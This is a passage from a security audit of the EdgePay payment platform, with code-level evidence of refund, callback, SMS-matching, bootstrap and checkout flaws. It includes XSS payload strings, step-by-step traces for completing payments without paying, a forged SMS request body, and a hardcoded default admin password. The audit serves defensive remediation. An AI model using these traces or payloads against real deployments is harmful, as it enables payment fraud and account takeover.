                                   → 3 files / 34 tests passed

Static sweeps (all manually reviewed):
  rg "innerHTML|outerHTML|insertAdjacentHTML|eval\(|Function\(" src → 0 hits
  rg 'prepare.*\$\{' src                                          → 0 hits (dynamic placeholders are '?'-lists — safe)
  rg "Math\.random" src                                           → 1 hit: admin-api.ts:376 (pairing OTP)
  rg "\.exec\(" src (non-regex)                                   → lib/db.ts:56 (migrations runner)
  rg "op_live_" scripts                                           → 3 hits (EDGE-P0-001; values redacted)
  rg "csrf" src/index.ts                                          → type declaration only (never mounted)
  rg "perIpRateLimit" src                                         → mounted once: '/install*'
  rg "UPDATE ledger|DELETE FROM ledger"                           → only postings/status bookkeeping (§8.5)
  ls .wrangler .dev.vars                                          → absent (clean tree)
  git log --oneline --all                                         → 37da6d6 Initial commit (single commit; secrets included)
```

Every code reference in this report was read directly from the extracted archive during this audit; line numbers refer to the files as shipped in `edgepay-cf-clean.zip`.

---

# PART II — EVIDENCE ANNEXES

The annexes contain the line-level evidence trail behind Part I: code excerpts with commentary, per-file audit tables, complete query inventories, reproduction scripts, and operational runbooks. All excerpts are verbatim from the audited tree (file:line references included) with auditor annotations.

---

# Annex 1 — P0 Evidence Dossiers (code excerpts with commentary)

## A1.1 EDGE-P0-002 dossier — the refund ID-space confusion, end to end

**Step 1 — the refund row stores a *payment* table id.** `src/services/refund.ts:50-70`:

```ts
const tx = await env.DB.prepare(
  `SELECT t.id, t.trx_id, t.amount, t.currency, t.status, t.merchant_id,
          t.gateway_trx_id, g.slug AS gateway_slug, pi.id AS payment_intent_id
   FROM op_transactions t
   JOIN op_payment_intents pi ON pi.id = t.payment_intent_id
   LEFT JOIN op_gateways g ON g.id = t.gateway_id
   WHERE t.id = ? AND t.merchant_id = ? LIMIT 1`,   // t.id = op_transactions.id
).bind(input.transaction_id, input.merchant_id).first<{ id: number; … }>();
```
`input.transaction_id` (from `POST /api/admin/v1/refunds` body) is `op_transactions.id`. The refund row persists it verbatim: `INSERT INTO op_refunds (… transaction_id …) VALUES (… input.transaction_id …)` (refund.ts:105-124).

**Step 2 — the workflow passes that id to a function that expects the *ledger* table id.** `src/workflows/refund-reconciliation.ts:175-190`:

```ts
await step.do('post-ledger-reversal', { retries: STEP_RETRIES, timeout: '30 seconds' },
  async (): Promise<{ ledger_transaction_id?: number }> => {
    const ledger = new LedgerService(env);
    // The original tx row may already be 'reversed' from a prior
    // partial run — treat that as success, not failure.
    try {
      const result = await ledger.reverse(refund.transaction_id, `Refund ${refund.refund_id}`);
      return { ledger_transaction_id: result.ledger_transaction_id };
    } catch (err) {
      if (String(err).includes('already reversed')) return {};   // ← swallow
      throw err;
    }
  });
```

**Step 3 — `reverse()` looks in the wrong table.** `src/services/ledger.ts:122-141`:

```ts
async reverse(ledgerTransactionId: number, reason: string): Promise<PostingResult> {
  const original = await this.env.DB.prepare(
    `SELECT id, merchant_id, uuid, reference_type, reference_id, description
     FROM op_ledger_transactions WHERE id = ? AND status = 'posted' LIMIT 1`,  // ← op_ledger_transactions
  ).bind(ledgerTransactionId).first<{ … }>();

  if (!original) {
    // Already reversed (or never existed) — idempotent no-op signal.
    throw new Error('Ledger transaction not found or already reversed');   // ← message contains "already reversed"
  }
```

**Auditor annotation — the three failure modes:**
1. `op_ledger_transactions.id` numerically equals some *other* posting's id → that posting is selected, its entries are inverted (ledger.ts:151-155 builds `reversedEntries` from `op_ledger_entries WHERE ledger_transaction_id = ?`), and `op_ledger_transactions.status` flips to `'reversed'` (ledger.ts:169-172). The DO applies the inverse deltas; balances of accounts belonging to **two unrelated business events** move. Trial balance remains Σ-balanced (so the daily check stays green) while account-level truth is destroyed.
2. No numeric match → the throw at ledger.ts:139-141 → the workflow's `String(err).includes('already reversed')` at :186 evaluates **true for the not-found message** → `{}` returned → the reversal step is *recorded as succeeded*, `mark-refund-completed` runs (213-221), and the refund webhook is dispatched (192-210). No reversal exists anywhere.
3. Even in the "lucky" case where the ids happen to align with the payment's own ledger row, the reversal posts the **full inverse of the original entries** — `op_refunds.amount` is never consulted — so partial refunds over-reverse, and a second refund of the same payment silently no-ops (status now 'reversed').

**The intended key, for the fix:** the payment's ledger transaction is identifiable deterministically — `postPaymentLedgerEntry` signs it `m{merchant}:payment:{paymentIntentId}` (ledger.ts:383) and `writeLedgerAuditTrail` stores it in `op_ledger_transactions.uuid` (ledger-audit.ts:84-97). The workflow has `refund.transaction_id`; joining one hop (`op_transactions.payment_intent_id`) yields the key; `reverse()` should accept either the uuid or the id resolved from it.

---

## A1.2 EDGE-P0-004 dossier — the unbound callback, end to end

**Entry — the customer controls the query string.** `src/controllers/checkout.ts:257-273`:

```ts
checkoutRoutes.get('/:token/callback', async (c) => {
  const token = c.req.param('token');
  const callbackData = Object.fromEntries(new URL(c.req.url).searchParams);  // ← attacker-controlled
  const intent = … // resolved by token
  const service = new PaymentService(c.env);
  await service.handleCallback(intent.id, callbackData);
  return c.redirect(`/checkout/${token}/status`);
});
```

**Verify — the adapter acts on the supplied identifier only.** `src/gateways/sslcommerz/sslcommerz.gateway.ts:92-146` (abridged):

```ts
async verify(callbackData, credentials, _ctx) {
  const valId = String(cb.val_id ?? '');          // ← from the query string
  …
  const res = await gwJson<SslczValidationResponse>({
    url: `${baseUrl}/validator/api/validationserverAPI.php?${formBody({ val_id: valId, … })}`,
    method: 'GET', timeoutMs: 10000,
  });
  const valid = res.data.status === 'VALID' || res.data.status === 'VALIDATED';
  return {
    success: valid,
    gateway_trx_id: String(res.data.bank_tran_id ?? ''),
    amount: (res.data.amount as string | undefined) ?? null,   // ← returned…
    status: valid ? 'completed' : 'failed',
    trx_id: (res.data.tran_id as string | undefined) ?? valId, // ← our own order id, returned…
  };
}
```

bKash variant (`bkash.gateway.ts:117-165`): `verify` POSTs `execute {paymentID}` with the caller-supplied `paymentID` and returns `data.amount` on success.

**Completion — both returned bindings are discarded.** `src/services/payment.ts:312-321`:

```ts
const verifyResult = await adapter.verify(callbackData, credentials, { kv: c.env.KV });

if (verifyResult.success) {
  await this.completeTransaction(intent.trx_db_id, intent.id, verifyResult.gateway_trx_id);
  //                        ↑ no amount comparison · no verifyResult.trx_id comparison
} else { … }
```

And `completeTransaction` (payment.ts:349-399) posts **`tx.amount`** — the intent's own amount — to the ledger. The provider-returned `amount` and `trx_id` (the one field that would bind the confirmation to *this* intent, since EdgePay set it at initiate: sslcommerz `tran_id: params.trx_id` at :98; bkash `merchantInvoiceNumber: sanitizedTrxId` at :89-92) are never compared.

**Attack trace (numeric example):**
1. Attacker opens checkout for intent B (amount 100,000.00 BDT) and intent A (10.00 BDT) at the same merchant, same gateway.
2. Attacker completes A normally — bKash returns `paymentID_A`; SSLCommerz returns `val_id_A`.
3. Attacker browses `GET /checkout/{tokenB}/callback?paymentID=paymentID_A` (or `?val_id=val_id_A`). The callback URL is public knowledge (it is the `redirect_url` EdgePay sent to the gateway, and it appears in the customer's own browser during A's flow).
4. EdgePay executes/validates the **A** reference — genuine success — and completes **B**:
   `op_transactions B → completed`, ledger posting `m{m}:payment:{B} = 100,000.00` debit clearing / credit revenue, merchant webhook `payment.completed {amount:'100000.00'}`.
5. Merchant ships goods worth 100,000 for 10 actually received.

**Why the checkout token is not a defense:** the attacker legitimately holds token B (their own session). The token proves the caller is the *payer of B* — which is exactly the party motivated to cheat.

---

## A1.3 EDGE-P0-007 dossier — the NULL-amount SMS completion

**Producer side — how a TrxID-bearing, amount-less SMS row is created.** `src/queues/sms-consumer.ts:58-80`:

```ts
const extraction: SmsExtraction = await parser.parse(sms.body, sms.sender, sms.merchant_id);

await env.DB.prepare(
  `UPDATE op_sms_data
   SET parsed_amount = ?, parsed_trx_id = ?, parsed_at = ?, match_status = 'parsed', template_id = NULL
   WHERE id = ?`,
).bind(extraction.amount, extraction.trx_id, now, smsId).run();     // ← NULL amount persisted with the TrxID

if (extraction.parser === 'none') { …
  await env.DB.prepare(`UPDATE op_sms_data SET match_status = 'no_match' WHERE id = ?`)…
```

`extractFallbackHeuristic` (sms-parser.ts:132-139) returns exactly `{amount: null, trx_id, parser:'none'}` when a TrxID matches the keyword regex but no amount pattern does — format drift, truncated delivery, or an attacker-crafted body (via the mobile API, post-pairing). The row therefore ends as `match_status='no_match'` **with `parsed_trx_id` set**.

**Consumer side — the query accepts that row and the guard short-circuits on NULL.** `src/controllers/checkout.ts:166-191`:

```ts
const matchingSms = await c.env.DB.prepare(
  `SELECT id, parsed_amount, parsed_trx_id, sender, created_at
   FROM op_sms_data
   WHERE merchant_id = ?
     AND UPPER(TRIM(parsed_trx_id)) = ?
     AND match_status IN ('pending', 'parsed', 'needs_manual_review', 'no_match')   -- ← includes no_match
   ORDER BY created_at DESC LIMIT 1`
).bind(intent.merchant_id, normalizedTrxId).first<{ … }>();

if (matchingSms) {
  const { cmp } = await import('../lib/money');
  if (matchingSms.parsed_amount && cmp(matchingSms.parsed_amount, intent.amount) !== 0) {  // ← NULL ⇒ skip
    return c.json({ … code: 'AMOUNT_MISMATCH' … }, 400);
  }
  // falls through to completeTransaction(txId, intent.id, normalizedTrxId)   ← completes at intent.amount
```

**Contrast with the strict gate the queue consumer uses** (`sms-corroboration.ts:106-147`): there, `!extraction.amount ⇒ manual_review` and `cmp !== 0 ⇒ no_amount_match` — mandatory, exact. The checkout handler is a *shadow copy* of this logic with both guards weakened. That asymmetry is the finding.

**Two exploitation modes:**
- **Passive (no attacker):** carrier SMS template changes; amount fails to parse; TrxID parses; customer's smaller payment auto-completes a larger awaiting intent — merchant ships on false confirmation.
- **Active (paired-device compromise — §19 branch A3):** attacker POSTs `{"sender":"BKASH","body":"Payment successful TrxID ABC123"}` (no amount anywhere) via `/api/mobile/v1/sms`, then submits TrxID `ABC123` on their own 99,999.00 intent via `/checkout/{token}/verify` → completed, ledger posted, webhook dispatched.

---

## A1.4 EDGE-P0-005 dossier — the bootstrap chain

```ts
// src/services/bootstrap.ts — the defaults (lines 37-40)
const adminEmail = env.ADMIN_EMAIL ?? 'admin@edgepay.internal';
const defaultPhone = env.DEFAULT_MFS_NUMBER ?? '01815300789';
const initialOtp = env.DEFAULT_PAIRING_OTP ?? '123456';
const defaultWebhook = env.DEFAULT_WEBHOOK_URL ?? …'/mock-webhook'…;

// line 68 — the password everyone can read in the public repo:
const passwordHash = await hashPassword('AdminPass123456!');

// lines 213-226 — the root key + plaintext KV copy:
newApiKey = `op_live_${keyPrefix}_${keyRest}`;
await env.DB.prepare(`INSERT INTO op_api_keys (…) VALUES (…, '[…,"*"]', 'active', …)`).run();
await env.KV.put('system:root_api_key', newApiKey);           // ← plaintext, forever

// src/index.ts:83-108 — armed on any request when the KV flag is absent (fresh or flushed KV):
const isBootstrapped = await c.env.KV.get('system:bootstrapped');
if (!isBootstrapped) { … waitUntil(ensureSystemBootstrapped(c.env)) … }

// src/controllers/install.ts:269-317 — the exchange endpoint (no install-lock, no lockout):
installRoutes.post('/bootstrap-key', async (c) => {
  … verifyPassword(body.admin_password, user.password_hash) …
  // → INSERT op_api_keys (… '[…,"*"]' …) → return { api_key }
});

// src/middleware/rate-limit.ts:37 — the actual throttle in front of that endpoint:
'install': { windowSec: 60, maxRequests: 120, keyPrefix: 'rl:install:' },  // vs the "3/hour" comment in index.ts:181
```

**Chain:** public repo ⇒ known password ⇒ un-throttled exchange ⇒ `'*'`-scoped key ⇒ `GET /api/admin/v1/merchants` (all tenants) ⇒ `POST /api/admin/v1/merchants` (harvest each new tenant's key/secret/OTP) ⇒ mobile pairing with the known/default OTP ⇒ SMS injection ⇒ EDGE-P0-007 ⇒ money creation. Every link is verified above; none requires a vulnerability beyond the defaults themselves.

---

## A1.5 EDGE-P0-006 dossier — the checkout injection points

**Point 1 — CSS context breakout (brandColor).** `src/controllers/checkout.ts:60-62` and `:321`:

```ts
const merchant = c.get('merchant') as { name?: string; color?: string } | null;
const brandColor = merchant?.color ?? '#0052cc';        // ← no validation anywhere in the file
…
<style>
:root {
  --primary: ${opts.brandColor};                        // ← raw interpolation into <style>
```
`merchant.color` comes from the domain-resolved `op_merchants` row (`SELECT * FROM op_merchants` in domain.ts:121-124) — a merchant-settable column. Payload `</style><script>…</script>` closes the style element early and executes script in the checkout origin.

**Point 2 — JS-string-in-attribute breakout (account_number / instructions).** `checkout.ts:597-600` (and the init call at 664-665):

```html
<label class="gateway-option …" onclick="selectGateway(this, ${gw.id},
  '${escapeHtml(gw.account_number || '')}',
  '${escapeHtml(gw.instructions || '')}',
  '${escapeHtml(gw.type)}')">
```
with (checkout.ts:754-760):
```ts
function escapeHtml(s: string): string {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}                                                        // ← no single-quote escaping
```
A value containing `'` escapes the JS string literal (the attribute itself is double-quoted, so `&quot;` is irrelevant here): `account_number = "',null,'x');alert(1);//"` yields executable `alert(1)` (plus arbitrary exfiltration payloads) on every gateway selection, on the shared checkout origin.

**Point 3 — no CSP.** `src/index.ts:160-161` mounts `securityHeadersMiddleware` on `/api/*` and `/webhook/*` only; the file's own comment (151-159) admits the HTML routes were deferred. The builtin `secureHeaders` (index.ts:125-128) sets framing/referrer policies but **no Content-Security-Policy** — so neither injection point has a second line of defense.

**Contrast — correctly escaped fields in the same template:** `brandName`, `amount`, `currency`, `description`, `gw.name` all pass through `escapeHtml` in HTML text contexts (e.g. lines 581-587, 601-606, 613) — the template *knows* how to escape; the two injection points are the fields whose contexts are CSS and JS-attribute, which `escapeHtml` does not cover. This is the briefs' "contextual escaping" requirement, violated twice in one template.

---

# Annex 2 — Middleware-by-Middleware Audit Table

For each middleware: mount point, order position, what it actually gates, bypass conditions, and verdict.

| Middleware | Mounted at | Order | Gates | Bypass conditions | Verdict |
|---|---|---|---|---|---|
| `requestId` | `*` | 1 | request id generation | none | PASS |
| `logger` | `*` | 2 | access logging | none | PASS |
| bootstrap-check | `*` | 3 | KV flag → waitUntil(bootstrap) | `/install*` skips; KV error ⇒ warn + continue (fail-open, safe direction) | CONDITIONAL (P0-005 enabler) |
| `domainMiddleware` | `*` | 4 | host→tenant; route-type confinement | master domain; `/install`,`/assets/*`,`/storage/*`,`/favicon.ico` pre-check; not-installed ⇒ skip all | PASS (with P2-004 consequence for webhooks) |
| `maintenanceMiddleware` | `*` | 5 | KV `system:maintenance` → 503 | bypass prefixes; KV missing ⇒ pass (fail-open by design — availability choice) | CONDITIONAL |
| `prettyJSON` | `*` (dev) | 6 | dev formatting | production | PASS |
| `secureHeaders` (builtin) | `*` | 7 | XFO DENY, Referrer-Policy | none | PASS (no CSP — see P0-006) |
| `cors` | `/api/*` | 8 | origin allowlist fail-closed, no credentials | allowlist empty ⇒ no cross-origin | PASS |
| `securityHeadersMiddleware` | `/api/*`,`/webhook/*` | 9 | nonce CSP + nosniff etc. | **HTML routes not covered** | CONDITIONAL (P0-006) |
| `accessAuthMiddleware` | `/api/admin/*` | 10 | Access JWT / admin key / break-glass | unconfigured Access ⇒ bearer pass-through (inner layer still authenticates) | CONDITIONAL (§9.5) |
| `perIpRateLimit('install')` | `/install*` | 11 (before routes) | KV counter | racey counter; 120/min config | FAIL (P1-010) |
| `requireBearerApiAuth` | `/api/v1` route-level | first in stack | key auth + scopes + tenant match | — | PASS core / FAIL wiring (P1-008) |
| `rateLimitMiddleware` | `/api/v1`, `/api/admin/v1` | after auth | per-key native binding | binding absent ⇒ allow+metric | CONDITIONAL (P2-005) |
| `requireJwtAuth` | `/api/mobile/v1` route-level | after open endpoints | mobile JWT | path-suffix exemptions (fragile) | CONDITIONAL |
| `createIdempotencyMiddleware` | POST /payments, POST /refunds | inside route | key + body-hash + response cache | concurrent race; cross-endpoint key | FAIL (P1-001) |
| `csrfMiddleware` | **nowhere** | — | (would gate non-GET HTML) | everything | DEAD CODE (P2-001) |

**Route × protection matrix** (the briefs' Phase 2 deliverable; ●=enforced, ○=not applicable, ✘=gap):

| Route family | Domain check | Auth | Scope check | Rate limit | Idempotency | Tenant scoping | Verdict |
|---|---|---|---|---|---|---|---|
| `/api/v1/payments` POST | ● | ● bearer | ✘ no write scope | ● per-key | ● (racey) | ● | FAIL (scope) |
| `/api/v1/payments/:id` GET | ● | ● | ○ read default | ● | ○ | ● | PASS |
| `/api/v1/transactions*` GET | ● | ● | ○ | ● | ○ | ● | PASS |
| `/api/v1/refunds` POST | ● | ● | ● write | ● | ● (required) | ● | FAIL (P0-003 semantics) |
| `/api/v1/customers`, `/api-keys`, `/webhooks` (GET/POST/DELETE) | ● | ● | ✘ POST/DELETE lack write/admin per route | ● | ○ | ● | FAIL (P1-008) |
| `/api/admin/v1/*` | ● | ● Access+admin key | ● admin (3 routes only) | ● | ○ | ✘ /merchants, /reconcile global | FAIL (P1-005) |
| `/api/mobile/v1/pair\|devices\|refresh` | ● | ✘ by design (OTP/token) | ○ | ✘ **none** | ○ | ● (token-bound merchant) | FAIL (P1-002) |
| `/api/mobile/v1/*` (JWT) | ● | ● | ○ scope in token | ✘ none | ○ | ● | CONDITIONAL |
| `/checkout/:token` GET | ● | token (unguessable) | ○ | ✘ none | ○ | ● (token→merchant) | CONDITIONAL |
| `/checkout/:token/initiate\|verify` POST | ● | token | ○ | ✘ none | ✘ none | ● | FAIL (P0-004/007, P2-014) |
| `/webhook/:gateway` POST | ● | ○ signature (gateway) | ○ | ✘ none | ● event dedup (leaky) | ●/✘ (P2-004) | FAIL (P1-003) |
| `/install` GET/POST | bypass | ○ first-run | ○ | ● install group (mis-set) | ○ | n/a | CONDITIONAL (P0-005) |
| `/api/v1/health` | ● | public | ○ | ✘ | ○ | n/a | PASS |

---

# Annex 3 — D1 Query Inventory (tenant-scoping verification)

Every `prepare(` in `src/` was read and classified. Non-exhaustive list of the merchant-data-touching queries with their scoping verdicts:

| Call site | Predicate | Scoped? |
|---|---|---|
| api.ts:79-86 payment GET | `WHERE id = ? AND merchant_id = ?` | ✔ |
| api.ts:104-114 transactions list | `WHERE merchant_id = ?` (+status param) | ✔ |
| api.ts:127-130 transaction GET | `WHERE trx_id = ? AND merchant_id = ?` | ✔ |
| api.ts:160-174 refund tx lookup | `WHERE t.trx_id = ? AND t.merchant_id = ?` | ✔ |
| api.ts:203-209 refund credentials | join via `t.id` + `gc.merchant_id = ?` | ✔ |
| api.ts:265-268 customers | `WHERE merchant_id = ?` | ✔ |
| api.ts:278-284 / 306-317 api-keys | `WHERE merchant_id = ?` | ✔ |
| api.ts:334-339 / 354-357 / 377-380 webhooks | `WHERE merchant_id = ?` | ✔ |
| api.ts:403-410 deliveries | `WHERE merchant_id = ?` | ✔ |
| admin-api.ts:42-49 domain verify | `WHERE domain = ? AND merchant_id = ?` | ✔ |
| admin-api.ts:73-81, 88-101 templates | `WHERE merchant_id = ?` / `AND merchant_id = ?` | ✔ |
| admin-api.ts:107-115, 121-124 devices | `WHERE merchant_id = ?` | ✔ |
| admin-api.ts:130-137, 145-148 SMS queues | `WHERE merchant_id = ?` | ✔ |
| admin-api.ts:247-252 **merchants list** | none — all rows | ✘ (P1-005) |
| admin-api.ts:275-289 **merchant create** | n/a (INSERT, any caller) | ✘ (P1-005) |
| checkout.ts:19-24 / 81-83 / 115-121 / 199-201 | token-keyed lookups (`WHERE token = ?`) | ✔ (token is a bearer secret) |
| checkout.ts:149-153 trx-used check | `WHERE t.gateway_trx_id = ? AND t.status='completed' AND t.payment_intent_id != ?` — **no merchant_id** | ✘ cross-tenant *read* of existence only (id-oracle; the response differs when another merchant completed the same TrxID — minor info leak, note) |
| webhooks.ts:71-79 master-domain merchant match | `WHERE g.slug = ? AND active…` ORDER BY platform | ✘ (P2-004) |
| webhooks.ts:91-94, 118-121 gateway config | `WHERE gateway_id = ? AND merchant_id = ?` | ✔ |
| webhooks.ts:205-208 completion tx | `WHERE trx_id = ? AND merchant_id = ?` | ✔ |
| mobile.ts:27-32 pairing token | `WHERE token = ? AND used_at IS NULL` | ✔ (token is the secret) |
| mobile.ts:127-129 heartbeat | `WHERE id = ?` — **no merchant** | ✘ (P3-002 wrong-row) |
| mobile.ts:237-244 notifications | `WHERE merchant_id = ? AND device_id = ?` | ✔ (id confusion P3-002 aside) |
| mobile.ts:256-260 **notification ack** | `WHERE id IN (…)` — **no merchant** | ✘ (P3-003) |
| payment.ts:79-104 gateway resolution | `WHERE merchant_id = ?` | ✔ |
| payment.ts:173-187 intent for initiate | `WHERE pi.id = ?` (id from token lookup) + gateway `AND merchant_id = ?` | ✔ |
| payment.ts:275-291 callback intent | `WHERE pi.id = ?` (token-derived) | ✔ |
| payment.ts:354-369 completion tx | `WHERE t.id = ?` (caller-supplied row id) | ⚠ — safe only because every caller derives it from a merchant-scoped lookup (webhook:206, checkout:199, sms-consumer:129); defense-in-depth: add `AND merchant_id` |
| ledger.ts:303-309 account resolution | `WHERE merchant_id = ? AND id IN (…)` | ✔ |
| refund.ts:50-57 refund tx | `WHERE t.id = ? AND t.merchant_id = ?` | ✔ |
| refund-reconciliation.ts:99-106 refund row | `WHERE id = ?` (workflow param, internally minted) | ✔ by construction |
| reconciliation.ts:70-78 pending postings | `WHERE status='pending' AND created_at < ?` (global by design) | ✔ platform op |
| sms-consumer.ts:127-133 open orders | `WHERE t.merchant_id = ? AND created_at >= ?` | ✔ |
| sms-parser.ts:175-178 templates | `WHERE merchant_id IN (0, ?)` | ✔ (shared+own) |
| domain.ts:107-110 / 121-124 | hostname-keyed | ✔ |
| bootstrap/install inserts | n/a | ✔ |

**Summary:** 40+ merchant-scoped queries verified ✔; 5 exceptions (2 P1, 2 P2/P3, 1 id-oracle) — the isolation discipline is high, which makes the exceptions (all in admin/mobile edges) stand out as fixable lapses rather than a systemic pattern.


---

# Annex 4 — Service & Controller Deep-Dive Notes

Per-file notes that did not fit the main findings, recorded for the remediation team.

## A4.1 `src/services/payment.ts`

- `createIntent` (62-162): zod-validated input arrives via api.ts (amount regex, currency 3-letter, expires 60-86400s). Service-level: `isZero` guard only. Currency upper-cased; description stored raw (rendered escaped in checkout — OK). `metadata` stored as JSON verbatim — PII carrier (Annex on retention). Gateway resolution order: explicit id → slug lookup (merchant-scoped) → first gateway → **auto-seed manual** (the P1-007 race). `trxId = 'op_' + randomToken(12)` = 24 hex chars — UNIQUE enforced.
- `initiatePayment` (168-265): loads intent + gateway (merchant-scoped); credentials decrypted with silent-skip (P2-009); manual branch returns instructions incl. `DEFAULT_MFS_NUMBER` env fallback; adapter branch passes `redirect_url` `${APP_URL}/checkout/{token}/callback` — the predictable callback that EDGE-P0-004 abuses. Status flip batch (253-262) — atomic but unguarded (P1-006).
- `handleCallback` (271-324): joins intents→transactions→gateways by id; adapter.verify with credentials; success → completeTransaction; **failure → unguarded 'failed'** (317-321). No amount/binding check (P0-004). Note: the failure path *also* runs when `adapter.verify` throws — Hono's error handler converts to 500 instead (the UPDATE only runs on a clean `success:false`), so the regression scenario requires a *returned* failure (common: expired payment sessions).
- `completeTransaction` (349-416): ledger-first ordering correct; `postPaymentLedgerEntry` uses `tx.fee` — **the fee is never written by any code path** (created as '0.00' at insert; nothing updates it before completion — the fee legs of the posting never fire in practice; net_amount == amount always). Dead fee logic (INFO; the posting protocol supports it, the product never populates it). Webhook dispatch (401-415) enqueues per subscribed endpoint; `data` includes amount/fee/status.

## A4.2 `src/services/ledger.ts` + `ledger-audit.ts`

- `moneyToMinorStrict` (80-89): regex + `Number.isSafeInteger` — the money→int boundary is airtight for 2-decimal currencies; exponent parameter exists but no caller passes non-2 (P2-019).
- `buildPayload` (299-337): resolves account ids→codes merchant-scoped; currency taken from the *first account row* (`?? 'BDT'`) — mixed-currency entry sets would post under the first account's currency and be rejected by the DO's CURRENCY_MISMATCH only if account currencies differ from the posting currency; since all default accounts share the merchant currency, latent.
- `insertPendingPosting` (28-61): `ON CONFLICT(tx_id) DO NOTHING` + status echo; the 'rejected' poison guard (175-180 in ledger-do) is a nice reconciliation interlock.
- `writeLedgerAuditTrail` (75-151): batch atomic; header `ON CONFLICT(uuid) DO NOTHING`; per-entry NOT-EXISTS guard (P2-008's 4-tuple); postings flip `status='posted', attempts+1`. The final `SELECT id WHERE uuid=?` (145-150) returns `?? 0` — a missing header yields `ledger_transaction_id: 0` silently (should throw; cosmetic today because the batch guarantees the header).

## A4.3 `src/controllers/api.ts` (beyond the findings)

- GET `/payments/:payment_id` returns `token` in the response (line 81: selected column) — the checkout bearer token is exposed to any read-scoped key of the merchant; acceptable (merchant owns their intents) but worth noting: a read-key holder can drive the checkout flow (combined with P1-008's write-gap).
- `/transactions` limit `Math.min(parseInt(...) ?? 20, 100)`; offset unvalidated (P2-014 sub-item).
- `/webhooks/tests` — when no endpoint exists and a `url` is supplied, it **registers** that URL (dispatcher sendTest 117-127) — a write-side-effect on a read-scope-reachable route (P1-008) and the cheapest SSRF registration path.
- `/gateways` — inventory of enabled adapters with field *names* only — good information hygiene (verified: `adapter.fields().map(name,label,type,required)`).

## A4.4 `src/controllers/admin-api.ts` (beyond the findings)

- `verifyDnsTxt` (169-186): DoH lookup via cloudflare-dns.com, `encodeURIComponent` on the record name — SSRF-safe (fixed host); no timeout (cron-side sibling of P2-020).
- POST `/merchants` steps are **not wrapped in a transaction**: a failure midway (e.g. chart creation) leaves a half-provisioned tenant (merchant + user, no chart/gateways) whose first payment throws "Default ledger accounts not initialized" — retry hits "merchant exists" 500. Idempotency: none. (P2-class provisioning robustness.)
- The provisioned user's `password_hash` is a **hardcoded bcrypt-shaped string** (`$2a$12$e8Y…` admin-api.ts:301) that no password verifies against (verifyPassword only understands `pbkdf2-sha256$…` format and returns false for anything else — crypto.ts:212-215). So provisioned users cannot log in until a password is set by some other path (none exists). Effect: provisioned tenants are API-key-only. Not a security hole (fail-closed); a functional gap worth noting (their `bootstrap-key` is also unusable since verifyPassword rejects the hash format).

## A4.5 `src/controllers/mobile.ts` (beyond the findings)

- Pairing marks OTP used **before** device insert success — an insert failure burns the OTP (availability nit).
- `device_id: deviceId` is embedded in the JWT (mobile.ts:69-74) but `requireJwtAuth` sets `authSubject` from `sub` (auth.ts:158) — the user id — while every handler treats authSubject as device id (heartbeat, SMS `device_id`, notifications) — the P3-002 confusion, restated here because it also means the SMS rows' `device_id` column records *user* ids, weakening device-level audit attribution.
- `/sms/batch` acknowledges ids it never validated (sender/body presence filter drops messages silently while acking them — 206-217: `if (msg.sender && msg.body)` else skip **without** recording a rejection) — the device will delete locally-acked messages that the server dropped → SMS loss on flaky input (P2-class reliability).

## A4.6 `src/controllers/install.ts` (beyond the findings)

- GET `/` leaks **secret posture** (length-class only: 'ok'|'weak'|'missing') pre-install — the route 302-redirects once installed, but the JSON branch (`format=json` or Accept header) is **not** gated by the installed check for JSON requests (`if (installed === 'true' && !isJsonReq)` — line 45: JSON probes on an installed system still get the posture!). Read the code: `installed === 'true' && !isJsonReq` ⇒ redirect only for non-JSON; a JSON request on an installed deployment returns the requirements+secrets posture — a pre-auth **oracle** revealing whether JWT_SECRET/APP_KEY/ENCRYPTION_KEY are weak/missing on a live system. Severity: P2 (recon aid; values never disclosed). Fix: gate the JSON branch identically.

## A4.7 `src/queues/*` and `src/workflows/*` (beyond the findings)

- `webhook-consumer.processOne` — on `logDelivery` D1 failure (insert throws), the exception path catches and retries the message even though the HTTP POST succeeded — duplicate deliveries to the merchant (bounded, benign; noted for the delivery-id fix).
- `sms-consumer.processOne` catch → `msg.retry({delaySeconds:60})` — a poison SMS (e.g. ReDoS template) retries 3× then DLQs; each retry re-inserts a **new** op_sms_data row (the insert precedes the parse) — row amplification ×4 per poison message (P2-015 amplifies this).
- `refund-reconciliation.queryGatewayRefundStatus` (233-284): manual-gateway refunds return `failed` immediately (no gateway_refund_id) — so *manual* refunds are marked failed by the workflow and page `REFUND_GATEWAY_FAILED`… yet `RefundService` deliberately records manual refunds as pending for the workflow to track ("processed off-band; the workflow polls and eventually pages if it never settles" refund.ts:79-81). Net effect: **every manual-gateway refund ends 'failed' + pages** — alert fatigue and wrong terminal status for the most common BD flow (bKash/Nagad/Rocket manual). This compounds P0-002: manual refunds never reverse (failed ⇒ early return before finalizeRefund) **and** page operators daily. Verdict addition: manual refunds are structurally broken end-to-end (mark-failed + no reversal + page noise). Upgrade P0-002's blast radius accordingly.
- `reconciliation-sweep` — steps have 5-minute timeouts; `reconcilePendingPostings(limit 500)` loops DO calls serially per pending row — 500 DO round-trips inside one step; at p50 20ms that is 10s, fine; at p99 200ms it is 100s — still under timeout; document the budget.

## A4.8 `src/cron/handler.ts` (beyond the findings)

- `expirePendingIntents` marks `processing` intents expired — a payment mid-verification (customer just paid, SMS in flight) can be expired out from under the corroboration window (30-min window vs default 15-min expiry — expiry fires first by design; the *processing* inclusion is the aggressive part).
- The second UPDATE's subquery (`WHERE status='expired' AND updated_at = ?` — exact timestamp equality) matches only the rows just flipped in the same run *and* any row whose updated_at happens to equal `now` — correct-by-construction but brittle; use the id list from the first UPDATE's meta or a RETURNING clause equivalent.
- `processPendingSmsVerifications` — re-enqueues pending SMS every 5 minutes forever (no attempt counter): a permanently unparseable-but-pending row (possible if the consumer crashed between insert and parse-update) loops forever — each pass inserts ANOTHER op_sms_data copy row via the consumer. Add an attempts column or a pending-age cap.

---

# Annex 5 — Migration & Schema Table-by-Table Analysis

`migrations/0001_initial_schema.sql` (768 lines) + 0002/0003/0004. Key tables with audit verdicts:

| Table | PK / UNIQUE | FK | CHECK / NOT NULL | Money | Tenant key | Verdict |
|---|---|---|---|---|---|---|
| op_merchants | id, uuid? (unique not declared — slug not unique!) | — | status values | — | — | ⚠ slug duplicates possible (routes derive slugs by name) |
| op_merchant_users | id | merchant CASCADE | status, email_hash indexed | — | ✔ | OK |
